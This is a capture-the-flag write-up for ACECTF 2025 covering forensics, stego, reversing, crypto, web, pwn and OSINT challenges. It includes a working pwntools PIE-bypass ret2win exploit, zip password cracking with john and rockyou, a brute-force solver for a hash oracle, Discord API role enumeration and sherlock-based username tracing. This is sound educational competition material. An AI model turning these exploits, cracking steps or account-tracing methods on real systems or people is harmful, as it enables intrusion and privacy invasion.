# ACECTF 2025

## Forensics

### Broken Secrets

Extract brokenfr 7z. Go into /word/media and there is not_so_suspicious_file

![brokenheader2](https://hackmd.io/_uploads/Hku5Ge1jye.png)

The last chunk confirms if it's a .png file.

![brokenheader3](https://hackmd.io/_uploads/HkKWQekj1x.png)

There is IHDR chunk in the beginning, but the header missed.

So, we just change it as provided below.

![brokenheader4](https://hackmd.io/_uploads/Hy36Xe1oJe.png)

![brokenheaderflag](https://hackmd.io/_uploads/By-yEgkoJg.png)

Flag: ACECTF{h34d3r_15_k3y}

### Hidden in the traffic

Extract the ICMP data using this command

```
tshark -r Very_mysterious_file.pcapng -Y "icmp" -T fields -e data
```

and then remove string `ABCDEFGHIJKL`

![image](https://hackmd.io/_uploads/HyREegkiJg.png)

Flag: `ACECTF{p1n6_0f_D347h}`

### Virtual Hard Disk

### Another Reading between the Lines?
In hindsight, the file looks weirdly empty with lots of newlines. Newlines? If that's the only lead we have, I had a suspicion that the newlines may have some tricks, so I opened it in hex editor and it turns out I was right.
![image](https://hackmd.io/_uploads/H17NKJkoyg.png)
Lots of `0D` and `0A`, or `\r` and `\n`. In Windows, if we press "Enter" to a text editor, the newline contains two characters, `\r\n`, usually denoted with CR-LF. But in Unix the newline only contains `\n`. The story behind it is quite fascinating, so you see, computer back then was much more ancient, that "print" activity is actual printing. `\r` was denoted as Carriage Return (CR) and `\n` was Line Feed (LF). CR returns the print head into the first column, while LF moves the print head into the next row. If the LF is provided without CR, the print would look something like this:
```
Hello
     World
          Enter
```
So in the end CR+LF is needed. Why then Unix only use LF? Well because of the OS design, they decided that the CR is always implicitly defined everytime LF is denoted, "to save one byte".

Okay enough yapping, here's the code to parse it:
```python
with open("hidden", "rb") as f:
    data = f.read()

pointer = 0
datanew = ""
while pointer < len(data):
    if data[pointer:pointer+1] == b"\n":
        datanew += "0"
        pointer += 1
    elif data[pointer:pointer+2] == b"\r\n":
        datanew += "1"
        pointer += 2

print(datanew)
```
`010000010100001101000101010000110101010001000110011110110110111000110000010111110111001000110011001101000110010000110001011011100011011001011111011000100110010100110111011101110011001100110011011011100101111100110111011010000011001101011111011011000011000101101110001100110011010101111101`
Convert from binary:
`ACECTF{n0_r34d1n6_be7w33n_7h3_l1n35}`

### Fractured Frames

Change the height using this reference https://cyberhacktics.com/hiding-information-by-changing-an-images-height/ from `00` to `01`

![Screenshot 2025-02-28 at 15.15.04](https://hackmd.io/_uploads/SJHsllJo1x.png)

flag: `ACECTF{th1s_sh0uld_b3_en0u6h}`

### Keyboard Echo

Use this repo to parse https://github.com/TeamRocketIst/ctf-usb-keyboard-parser. But we need to extract the data from by running this `tshark` command

```
tshark -r ./usb.pcap -Y 'usb.capdata && usb.data_len == 8' -T fields -e usb.capdata > usbPcapData
```

### Deep Memory Dive

It can be solved using strings and grep btw

![Screenshot 2025-02-28 at 15.18.20](https://hackmd.io/_uploads/ryyvbxyoJx.png)

And for the last part, it also can be solved with strings and grep but we need to run pslist first to grep the specific program name

![image](https://hackmd.io/_uploads/HJjd-x1sye.png)

flag: `ACECTF{3xplor1n6_c0nc3al3d_th3_r1ddl3s}`

## Steganography

### Tabs&Spaces

We received a ZIP file containing a random Python script (which we didn't use) and multiple `.jpg` images. To simplify handling the files, we renamed the images to remove any spaces in their filenames.

We used exiftool to verify if the files were truly `.jpg`, but most of them turned out to be `.png`, with only one actually being a `.jpg`

![image](https://hackmd.io/_uploads/rJ_yxA051l.png)

let's check if there's something inside the image using stegseek.

![image](https://hackmd.io/_uploads/SykMgAAqkx.png)

there's `whitespace_flag.txt`.

After checking it out, apparently we can't use stegsnow to solve it, but let's try decoding it to binary where `\t` is 1 and `' '` is 0

command: `cat whitespace_flag.txt | tr ' ' '0' | tr '\t' '1'`
```
01000001
01000011
01000101
01000011
01010100
01000110
01111011
01101110
00110000
01011111
00110011
01111000
01110000
00110001
00110000
00110001
00110111
01011111
01101110
00110000
01011111
01100111
00110100
00110001
01101110
01111101
```
Put it into cyberchef and we got the flag
![image](https://hackmd.io/_uploads/H1G6gR0c1e.png)

flag: `ACECTF{n0_3xp1017_n0_g41n}`

### Cryptic Pixels

Binwalk the file to get password-protected zip file

```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1600 x 1080, 8-bit/color RGBA, non-interlaced
91            0x5B            Zlib compressed data, compressed
753923        0xB8103         Zip archive data, encrypted at least v1.0 to extract, compressed size: 38, uncompressed size: 26, name: flag.txt
754121        0xB81C9         End of Zip archive, footer length: 22
```

And then crack the zip file using `zip2john` and `john`

```
zip2john file.zip >> hash.txt
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

And the result was
```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
qwertyuiop       (B8103.zip/flag.txt)     
1g 0:00:00:00 DONE (2025-02-28 08:01) 33.33g/s 4369Kp/s 4369Kc/s 4369KC/s 123456..kovacs
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Unzip the zip file and read `flag.txt`

flag: `ACECTF{h4h4_y0u'r3_5m4r7}`

### HeaderHijack

Given a broken mp4 file:
![image](https://hackmd.io/_uploads/BJF9E0C9yg.png)

Using reference from this [web](https://www.file-recovery.com/mp4-signature-format.htm) we can fix the header, and the video will show the flag:

![image](https://hackmd.io/_uploads/BkZ7SR091e.png)

Flag: `ACECTF{d3c0d3_h3x_1s_fun}`

### Whispering Waves

We're given a wordlist and a zip file that is protected with a password. we can crack the zip using the wordlist provided from the challenge.

Cracking using john:
```
zip2john WishperingWaves.zip > hash.txt

john hash.txt
```
and the password is `Vierges`.

The zip contains a wav file. If we analyzed it using Sonic Visualizer and enable spectogram layer.

![image](https://hackmd.io/_uploads/r1LShkki1g.png)

bottom means 0 and top means 1, collect all the data and if it is decoded using binary then we will get the flag

Flag: `ACECTF{53cur1n6w3b}`

### Double Vision

Xor-ing both images, and analyzing the top right of the image, there are black and white pixels. Decode it using a morse code decoder and you will get a flag

![image](https://hackmd.io/_uploads/Bk5FiJki1x.png)

The result is: `.- -.-. . -.-. - ..-. -.. ----- --... ..--.- -.. ....- ..... ....`

flag: `ACECTF{D07_D45H}`

## Reverse

### Significance of Reversing

Opening the file would reveal a suspicious PNG header. It seems like it doesn't have other components of normal PNG
![image](https://hackmd.io/_uploads/HyRIOCC5yl.png)
Scrolling down to the bottom would reveal an ELF header in reverse. A reverse engineering challenge that can be solved by reversing?
![image](https://hackmd.io/_uploads/B1JBk11jyl.png)
Reversing the binary and running it will reveal the flag.

flag: `ACECTF{w3_74lk_4b0u7_r3v3r53}`

### The Chemistry Of Code
Reading the code, it's basically just a Rust code that's XOR ing a bunch of value to get the flag. Convert the code to python and do some adjustment to the functions and values.

```python
from binascii import hexlify
from functools import reduce

def hex_encode(input_str):
    return hexlify(input_str.encode()).decode()

def ionic_bond(cation_input, anion_input, ALKALINE_SECRET):
    cation_hex = hex_encode(cation_input)
    anion_hex = hex_encode(anion_input)

    cation_value = int(cation_hex, 16)
    anion_value = int(anion_hex, 16)

    covalent_link = cation_value ^ anion_value

    alkaline_secret_value = int(ALKALINE_SECRET, 16)

    metallic_alloy = covalent_link ^ alkaline_secret_value

    precipitate = format(metallic_alloy, "x")

    alloy_compound = "".join(chr(int(precipitate[i:i+2], 16)) for i in range(0, len(precipitate), 2))

    print(f"Flag: {alloy_compound}")

ALKALINE_SECRET = "4143454354467B34707072336E373163335F3634322C28010D3461302C392E"
ionic_bond("d3ru571fy1n6", "AdminFeroxide", ALKALINE_SECRET)
```
Somehow it is needed to decode the `NjQzMzcyNzUzNTM3MzE2Njc5MzE2ZTM2` part from base64 to `d3ru571fy1n6`, although the code doesn't really specify anything about decoding base64.

`ACECTF{4ppr3n71c3_w4l73r_wh1t3}`

### Trust Issues

Given a binary called `trust.exe`, decompiled using IDA:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __main();
  if ( argc > 1 )
  {
    if ( !strcmp(argv[1], "GRX14YcKLzXOlW5iaSlBIrN7") )
      puts("Correct!!");
    else
      puts("Wrong!!");
    return 0;
  }
  else
  {
    puts("Wrong!!");
    return 1;
  }
}
```

Nothing suspicious until, we see the implementation of the strcmp function:

```c
int __cdecl _strcmp(char *_Str1,char *_Str2)

{
  byte local_20 [24];
  uint local_8;
  
  local_20[0] = 6;
  local_20[1] = 0x11;
  local_20[2] = 0x1d;
  local_20[3] = 0x72;
  local_20[4] = 0x60;
  local_20[5] = 0x1f;
  local_20[6] = 0x18;
  local_20[7] = 0x7c;
  local_20[8] = 0x3e;
  local_20[9] = 0xf;
  local_20[10] = 0x6d;
  local_20[0xb] = 0x78;
  local_20[0xc] = 0x33;
  local_20[0xd] = 0x35;
  local_20[0xe] = 0x40;
  local_20[0xf] = 0x5e;
  local_20[0x10] = 0x3e;
  local_20[0x11] = 0x25;
  local_20[0x12] = 0x5f;
  local_20[0x13] = 0x30;
  local_20[0x14] = 0x78;
  local_20[0x15] = 0x14;
  local_20[0x16] = 0x37;
  local_20[0x17] = 0x4a;
  local_8 = 0;
  while( true ) {
    if (0x17 < local_8) {
      return 0;
    }
    if ((_Str1[local_8] == '\0') || (_Str2[local_8] == '\0')) break;
    if ((byte)(_Str1[local_8] ^ local_20[local_8]) != _Str2[local_8]) {
      return 1;
    }
    local_8 = local_8 + 1;
  }
  return 1;
}
```

Now we can decode the obfuscated flag, using this script:

```py
local_20=[6,17,29,114,96,31,24,124,62,15,109,120,51,53,64,94,62,37,95,48,120,20,55,74]
Str2="GRX14YcKLzXOlW5iaSlBIrN7"
res="".join(chr(ord(Str2[i])^local_20[i])for i in range(len(Str2)))
print(res)
```

Flag: `ACECTF{7ru57_bu7_v3r1fy}`

### Piped Up

Just xor the encrypted flag with bytecode in case 5. Here is the script:
```
enc = [0x6c,0x2c,0xe0,0xef,0x8d,0x60,0xdc,0x75,0x0d,0xff,0xd6,0x59,0xf4,0x5d,0xde,0x9b,0xe3,0xd7,0x52,0x99,0x5a,0x7c,0xa3,0xc9,0x4e,0x1b,0x45,0xe5,0xc0,0x29,0x9a] # case 2
key1 = [0x7b,0x2e,0xf1,0xeb,0x8b,0x76,0xe7,0x68,0x77,0xa3,0xef,0x52,0xf6,0x3c,0xda,0xaa,0xf6,0xa7,0x43,0xeb,0x21,0x24,0xc3,0x9c,0x7d,0x08,0x33,0xb7,0xf7,0x2c,0xb4] # case 5
key2 = 0x56 # case 3
key3 = [0] # case1

flag = []
for i in range(len(enc)):
    key3.append(enc[i] ^ key1[i])

for i in range(len(enc)):
    flag.append(enc[i] ^ key1[i] ^ key2 ^ key3[i])

print(''.join([chr(i) for i in flag]))
```

Flag: `ACECTF{p1p3d_53cr375_unc0v3r3d}`

### DONOTOPEN

Opening the DONOTOPEN file will reveal a bash script with binary info at the bottom.

```bash
#!/bin/bash

TMP_DIR=$(mktemp -d)
PYTHON_SCRIPT="$TMP_DIR/embedded_script.py"
CHECKSUM_FILE="$TMP_DIR/checksum.txt"

EXPECTED_CHECKSUM="g5c533c0e5e1dd82051e9ee6109144b6" 

ARCHIVE_START=$(awk '/^__ARCHIVE_BELOW__/ {print NR + 1; exit 0; }' "$0")
tail -n +$ARCHIVE_START "$0" | gzip -d > "$PYTHON_SCRIPT"


CALCULATED_CHECKSUM=$(md5sum "$PYTHON_SCRIPT" | awk '{ print $1 }')


if [ "$CALCULATED_CHECKSUM" != "$EXPECTED_CHECKSUM" ]; then
  echo "Checksum mismatch! The embedded script may have been corrupted."
  echo "Doesnt match with the MD5 checksum - a3c533c0e5e1dd82051e9ee6109144b6"
  rm -rf "$TMP_DIR"
  exit 1
fi


python3 "$PYTHON_SCRIPT"


rm -rf "$TMP_DIR"
exit 0

__ARCHIVE_BELOW__
...
```

Copy every bit of binary below the `__ARCHIVE_BELOW__` text to a new file, and then gunzip the file.
`gzip -d <filename>`

It will reveal a python code which is full of unnecessary part except the part at the bottom.

```python
import hashlib
import requests
import webbrowser  
NOT_THE_FLAG = "flag{this-is-not-the-droid-youre-looking-for}"
flag0 = 'flag{cfcd208495d565ef66e7dff9f98764da}'
flag1 = 'flag{c4ca4238a0b923820dcc509a6f75849b}'
...
flag204 = 'flag{274ad4786c3abca69fa097b85867d9a4}'
flag205 = 'flag{eae27d77ca20db309e056e3d2dcd7d69}'
url = 'https://vipsace.org/'
webbrowser.open(url)
flag206 = 'flag{7eabe3a1649ffa2b3ff8c02ebfd5659f}'
flag207 = 'flag{69adc1e107f7f7d035d7baf04342e1ca}'
...
flag998 = 'flag{9ab0d88431732957a618d4a469a0d4c3}'
flag999 = 'flag{b706835de79a2b4e80506f582af3676a}'
FLAG_PREFIX = "ACE{%s}"

print("It looks like the box is locked with some kind of password, determine the pin to open the box!")
req = requests.get("http://google.com")
req.raise_for_status()

pin = input("What is the pin code?")
if pin == "ACE@SE7EN":
    print("Looks good to me...")
    print("I guess I'll generate a flag")

    req = requests.get("http://example.com")
    req.raise_for_status()

    print(FLAG_PREFIX % hashlib.blake2b((pin + "Vansh").encode("utf-8")).hexdigest()[:32])
else:
    print("Bad pin!") 
```

Casually running it will ask for a pin code, which is `ACE@SE7EN`, and will reveal the flag.
```
It looks like the box is locked with some kind of password, determine the pin to open the box!
What is the pin code?ACE@SE7EN
Looks good to me...
I guess I'll generate a flag
```
`ACE{e2e3619b630b3be9de762910fd58dba7}`

## Miscellaneous

### Sanity Check

Just read the `#rules` description

![image](https://hackmd.io/_uploads/BJloP1Ji1l.png)

### Feeback Form

Just fill the feedback form

flag: `ACECTF{533_y0u_n3x7_y34r}`

### Insanity Check

Using discord API, we able to list all the roles

```
https://discord.com/api/v9/guilds/1314047484275724428/roles
```

There's a sus role named `r8F53sXv`. Now use another endpoint to list all the member

```
https://discord.com/api/v9/guilds/1314047484275724428/roles/1317849381084332032/member-ids
```

We got a username called `pastebin0459_24128`. We got stuck for a very long time until we search the role on pastebin

https://pastebin.com/r8F53sXv

flag: `ACECTF{7h47_w45_1n54n3}`

### Hash Guesser

Just guess the hash  using the feedback from the server, here is my solver (thanks chatgpt):

```
from pwn import *
import string
import random

# Server details
HOST = "34.131.133.224"
PORT = 5000

# Characters used in an MD5 hash (hexadecimal)
HEX_CHARS = string.hexdigits.lower()[:-6]  # '0123456789abcdef'

# Start with a random guess
guess = list('a' * 32)  # Initialize with a placeholder hash
best_match = 0
best_correct_pos = 0

def send_guess(guess):
    """Send MD5 guess to the server and return the response."""
    conn = remote(HOST, PORT)
    conn.recvuntil(b'Enter MD5 hash: ')
    conn.sendline(''.join(guess))
    
    response = conn.recv().decode()
    conn.close()

    # Parse the response
    matched = int(response.split("Characters matched: ")[1].split("/")[0])
    correct_pos = int(response.split("Characters in correct positions: ")[1].split("/")[0])
    
    return matched, correct_pos

# Try to solve the hash
for i in range(32):
    for c in HEX_CHARS:
        temp_guess = guess[:]
        temp_guess[i] = c  # Change one character at a time

        matched, correct_pos = send_guess(temp_guess)

        if matched > best_match or correct_pos > best_correct_pos:
            guess[i] = c  # Keep the best character
            best_match = matched
            best_correct_pos = correct_pos
            print(f"[+] New best guess: {''.join(guess)} (Matched: {matched}, Correct Pos: {correct_pos})")

print(f"[*] Final MD5 hash: {''.join(guess)}")
```

Wait until you got the correct MD5 hash

```
The target hash has been taken from a famous wordlist (~14 million passwords).
It was `base32 encoded`, then `reversed`, and then hashed using `MD5`.
Try cracking it. Good luck!

Enter MD5 hash: 88ef3cb6cbe5d99e6fee9f1e5cb248ba
Characters matched: 32/32
Characters in correct positions: 32/32
Match found!
Flag: ACECTF{h45h_cr4ck1n6_r3qu1r35_4_l177l3_w17}
```

flag: `ACECTF{h45h_cr4ck1n6_r3qu1r35_4_l177l3_w17}`

## Cryptography

### Super Secure Encryption

To get the flag we used this formula:

```
flag = (ciphertext1 ⊕ ciphertext2) ⊕ known_plaintext
```

Here is the solver

```
known_plaintext = 'This is just a test message and can totally be ignored.'
encrypted_text = bytes.fromhex('d71f4a2fd1f9362c21ad33c7735251d0a671185a1b90ecba27713d350611eb8179ec67ca7052aa8bad60466b83041e6c02dbfee738c2a3')
encrypted_flag = bytes.fromhex('c234661fa5d63e627bef28823d052e95f65d59491580edfa1927364a5017be9445fa39986859a3')

# Convert known_plaintext to bytes
known_plaintext_bytes = known_plaintext.encode()

# Perform XOR operations
result = bytes(x ^ y ^ z for x, y, z in zip(known_plaintext_bytes, encrypted_text, encrypted_flag)) 

print(result)
```

flag: `ACECTF{n07h1n6_15_53cur3_1n_7h15_w0rld}`

### Custom Encoding Scheme

### A Little Extra Knowledge Is Too Dangerous

Given a base64 (?) encoded string
`QUNFQ1RGe/MV82dTM1NV95MHVfN3J1bmM0N/zNkXzdoM18zeDdyNF9rbjB3bDN/kNjNfcjRkMG1fNTdyMW42NjY2NjY2NjY2NjU1NTU1NTU1NV/94eHh4eHh4YmJieHh4eHh4Y2N/jY3h9`

In Cyberchef, if we decode it:
![image](https://hackmd.io/_uploads/HJf_GRRcJg.png)

We can try to play with the position and appearance of `/` character
![image](https://hackmd.io/_uploads/S1e2MRRqyg.png)

Now we have a partial flag
`ACECTF{??????????????????????_7h3_3x7r4_kn0wl3d63_r4d0m_57r1n66666666666555555555_xxxxxxxbbbxxxxxxccccx}`

I tried to decode the `MV82dTM1NV95MHVfN3J1bmM0NzNk` alone, and we have this

`1_6u355_y0u_7runc473d`

Now just put it all together:

`ACECTF{1_6u355_y0u_7runc473d_7h3_3x7r4_kn0wl3d63_r4d0m_57r1n66666666666555555555_xxxxxxxbbbxxxxxxccccx}`

### Hexed and Squared

Just unhex the string 16 times

![image](https://hackmd.io/_uploads/B1C_d11s1e.png)

Flag: `ACECTF{5uch_4_5qu4r3}`

### Pipher - Piano Cipher

We solved this with intuition btw:
```
Ciphertext - DC# DD# DF DD# EC '70' G#B CE F#C FC# C#C# '104' C#A FC# F#A# C#A C#A '108' CF AF# C#C FC# CE '102' FC# C#A# FC# GA# CE '112' FC# C#B C#C# C#A# GC '125'
```

If we decode the known ciphertext and the decimal value, we got this string:
```
A C E C T F { CE F#C FC# C#C# h C#A FC# F#A# C#A C#A l CF AF# C#C FC# CE f FC# C#A# FC# GA# CE p FC# C#B C#C# C#A# GC }
```

Now, in this step we tried to guess where is the character `_` in that cipher by looking at how many times a ciphertext appears: like for example ciphertext `C#A` appears 3 times

After analyzed this, we decided that `FC#` is equivalent to `_`. Now we got this string:

```
A C E C T F { CE F#C _ C#C# h C#A _ F#A# C#A C#A l CF AF# C#C _ CE f _ C#A# _ GA# CE p _ C#B C#C# C#A# GC }
```

by correlating the ciphertext with the challenges description. We got this string

```
A C E C T F { o h _ t h e _ f e e l i n g _ o f _ a _ t o p _ s t a r }
```

Remove the whitespace and translate it to leetspeek to get the flag

Flag: `ACECTF{0h_7h3_f33l1n6_0f_4_70p_574r}`

## Web Exploitation

### Buried Deep

### Webrypto

Given a website:

![Screenshot_139](https://hackmd.io/_uploads/HJLmEyJoJe.png)

If we take a look at the code presented here, we can see that we can get the flag if we met 2 if conditions. 

The first one is checking if the parameters are not equal. 

The second one is checking if The MD5 hash of 'ACECTF' . tom must loosely equal (==) the MD5 hash of 'ACECTF' . jerry

### Token of Trust

### Flag-Fetcher

Given a website:

![image](https://hackmd.io/_uploads/rkzjX0R9kg.png)

If we take a look at the network traffic, we can see that the flag is building itself using redirection:

![image](https://hackmd.io/_uploads/BkLFXC05kx.png)

Flag: `ACECTF{r3dr1r3ct10n}`

### Bucket List

Given an S3 endpoint:
![image](https://hackmd.io/_uploads/rJpk-009yx.png)

We can access other item in the S3 bucket by visiting https://opening-account-acectf.s3.ap-south-1.amazonaws.com/

![image](https://hackmd.io/_uploads/BJUYW00cyl.png)

With a bit of analyzing, we found a file called secret.txt, inside of it we will find the flag.

![image](https://hackmd.io/_uploads/HJxj-0Rcke.png)
![image](https://hackmd.io/_uploads/Hyqh-RCckg.png)

Flag: `ACECTF{7h3_4w5_15_m15c0nf16ur3d}`

## Binary Exploitation

### !Underflow

Given a binary called "exploit-me", we decided to decompile with Ghidra.

![image](https://hackmd.io/_uploads/rymjzR0qkl.png)

Looking at the function list, we were curious about the `print_flag` function so we decided to take a look further.

![Screenshot 2025-02-27 163105](https://hackmd.io/_uploads/SyRDfCCcJx.png)

The flag was just written in plain text: `ACECTF{buff3r_0v3rfl3w}`


### jumPIEng

Given a binary called "redirection", after analysing in Ghidra it looked like a PIE challenge with ret2win. We are given a main function address leak, and that is enough to get base address.

Following the PIE bypass tutorial from ir0nstone: https://ir0nstone.gitbook.io/notes/binexp/stack/pie/pie-exploit

It is enough to redirect to the win function known as `redirect_to_success`:

![image](https://hackmd.io/_uploads/ryeSLAA5Jl.png)


The solver script is:

```python=
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# -*- template: wintertia -*-

# ====================
# -- PWNTOOLS SETUP --
# ====================

from pwn import *

exe = context.binary = ELF(args.EXE or 'redirection')
trm = context.terminal = ['tmux', 'splitw', '-h']

host = args.HOST or '34.131.133.224'
port = int(args.PORT or 12346)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# =======================
# -- EXPLOIT GOES HERE --
# =======================

io = start()

log.info(io.recvuntil("address: "))
leak = int(io.recvline().strip(), 16)
log.info(f"leak: {hex(leak)}")

exe.address = leak - exe.sym['main']
log.info(io.clean())

payload = hex(exe.sym['redirect_to_success'])
log.info(f"payload: {payload}")
io.sendline(payload)

io.interactive()
```

![image](https://hackmd.io/_uploads/r1b4IRR5ye.png)


Flag : `ACECTF{57up1d_57up1d_h4rry}`

### Running Out of Time

Given a binary for Windows called "Running_Out_Of_Time.exe", we decided to decompile with Ghidra. Because there was no nc, it means that we definitely can just do static analysis.

![image](https://hackmd.io/_uploads/BkdI7RAcJg.png)

In the main function it looked like a simple RNG prediction challenge, but it looked like it just goes to a function called `p3xr9q_t1zz`, so we looked on it.

![Screenshot 2025-02-27 165400](https://hackmd.io/_uploads/HJ1P4CA9kl.png)

So we were lazy to type all of the characters to decode the flag so we just opened DeepSeek:

![Screenshot 2025-02-27 165352](https://hackmd.io/_uploads/HJd9ERCcJg.png)

Flag: `ACECTF{71m3_570pp3d}`

## OSINT

### Fall of 2022

We can get the flag by checking TXT record of the website

![image](https://hackmd.io/_uploads/HJM19CR51x.png)

Flag: `ACECTF{y0u_g07_7h3_73x7}`

### The Symphony of Greatness

We're given a username called `modernlouis`. Use sherlock to find his social media

```
sherlock/sherlock modernlouis
[*] Checking username modernlouis on:

[+] AllMyLinks: https://allmylinks.com/modernlouis
[+] Genius (Users): https://genius.com/modernlouis
[+] HackenProof (Hackers): https://hackenproof.com/hackers/modernlouis
[+] MyAnimeList: https://myanimelist.net/profile/modernlouis
[+] Mydramalist: https://www.mydramalist.com/profile/modernlouis
[+] Myspace: https://myspace.com/modernlouis
[+] NationStates Nation: https://nationstates.net/nation=modernlouis
[+] NationStates Region: https://nationstates.net/region=modernlouis
[+] NitroType: https://www.nitrotype.com/racer/modernlouis
[+] Roblox: https://www.roblox.com/user.aspx?username=modernlouis
[+] TorrentGalaxy: https://torrentgalaxy.to/profile/modernlouis
[+] Xbox Gamertag: https://xboxgamertag.com/search/modernlouis
[+] YouTube: https://www.youtube.com/@modernlouis

[*] Search completed with 13 results
```

There are a lot of accounts, but if we check https://genius.com/modernlouis. There's another unique string in his bio

```
here for some lyriccsssssss!!!

Here’s the final step for the flag – “My name kind of contains a part of the band’s name”…..
Also, let’s see if you can make some sense out of this random string I found from some music streaming platform: 313vqcsij2k5ukfgqwhu27sr4l64
```

Use sherlock again, and we found a spotify account

https://open.spotify.com/user/313vqcsij2k5ukfgqwhu27sr4l64

![image](https://hackmd.io/_uploads/HyDUFARq1l.png)

In the public playlist, there is a playlist called `My <3`. And the band name is `Modern Talking` and his favourite music is `Cheri Cheri Lady`

Flag: `ACECTF{m0d3rn_74lk1n6_ch3r1_ch3r1_l4dy}`

### Social Circles

We're given a youtube username named `AhjussiPlayz`. If we check his channel, there's 1 video called `New intro!`

https://www.youtube.com/watch?v=aGr4IJ9SwUQ

There are 2 subtitle: english and korean. If we check the korean one, we got another username named `wimebix884`

![image](https://hackmd.io/_uploads/BJA9SACq1l.png)

Using sherlock, we got his smule account and inside the account there's a song called `Flag Debauchery`

https://www.smule.com/song/ace-flag-debauchery-karaoke-lyrics/21288264_21288264/arrangement?metaProps=%7B%22title%22%3A%22Flag%20Debauchery%22%2C%22handle%22%3A%22wimebix884%22%2C%22artist%22%3A%22ACE%22%2C%22key%22%3A%2221288264_21288264%22%2C%22coverUrl%22%3A%22https%3A%2F%2Fc-cdnet.cdn.smule.com%2Fsmule-gg-uw1-s-8%2Farr%2F23%2Fe6%2F871776b5-7c1d-48b3-8df2-a7efe0707865.jpg%22%7D

Download the mp3 file and we got the flag by hearing the audio

Flag: `ACECTF{mu171m3d14_f146}`

### For The Fans

We're given a username named `DrakeSaltyOVO`. If we're doing a basic OSINT using Sherlock, we got a x.com account

https://x.com/DrakeSaltyOVO

Based on `https://x.com/DrakeSaltyOVO/status/1862493972587061676`, it looks like we need to find another username `salty-senpai-drake1`. If we googled the username

![image](https://hackmd.io/_uploads/HJHrmR0qkl.png)

There is another social media account in tumbig.com

https://www.tumbig.com/blog/salty-senpai-drake1

If you noticed, there's a base64 encoded string his bio. Decode it and you will find a `7z` file. Now go back to his twitter bio, use the tweet to create wordlist based on his birth day. Here is the combination:

- 2000149
- 2000914
- 1420009
- 1492000
- 9200014
- 9142000

Try all of the combination until you can extract the `flag.txt` file

Flag: `ACECTF{y0u_b3773r_41nt_h4t3}`

### The Mysterious Building

We're given an image where it looks like some kind of building with a tower near it. we assume that it's in India after checking the metadata of the image using exiftool.

```
ExifTool Version Number         : 12.57
File Name                       : OSINT-1.jpg
Directory                       : .
File Size                       : 255 kB
File Modification Date/Time     : 2025:02:27 19:05:17+07:00
File Access Date/Time           : 2025:02:27 19:17:39+07:00
File Inode Change Date/Time     : 2025:02:27 19:05:17+07:00
File Permissions                : -rwxrwxrwx
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 96
Y Resolution                    : 96
XMP Toolkit                     : Image::ExifTool 13.10
Description                     : National Capital of India
Author                          : Описание соответствует действительности
Comment                         : Определенно не Россия
Image Width                     : 734
Image Height                    : 858
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 734x858
Megapixels                      : 0.630
```

Our team member said that it's the `Pitampura TV Tower`. After checking it using google maps, it's right and the building should be near that tower.

By using the logo on the building, we found the exact building

![image](https://hackmd.io/_uploads/ryvQGRC51g.png)

and the name of the building is `PP Trade Centre`

flag: `ACECTF{pp_trade_centre}`
